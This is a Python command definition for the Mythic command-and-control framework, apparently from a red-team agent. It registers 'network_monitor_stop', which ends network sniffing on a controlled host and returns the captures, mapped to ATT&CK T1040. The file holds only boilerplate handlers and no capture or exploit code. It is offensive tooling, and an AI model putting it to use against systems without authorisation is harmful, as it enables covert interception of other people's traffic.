from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class NetworkMonitorStopArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class NetworkMonitorStopCommand(CommandBase):
    cmd            = "network_monitor_stop"
    needs_admin    = False
    help_cmd       = "network_monitor_stop"
    description    = (
        "Stop network monitoring and return captured results. "
        "Returns plain text for ≤100 entries, or a downloadable file for larger captures."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = NetworkMonitorStopArguments
    parameters     = []
    attackmapping  = ["T1040"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
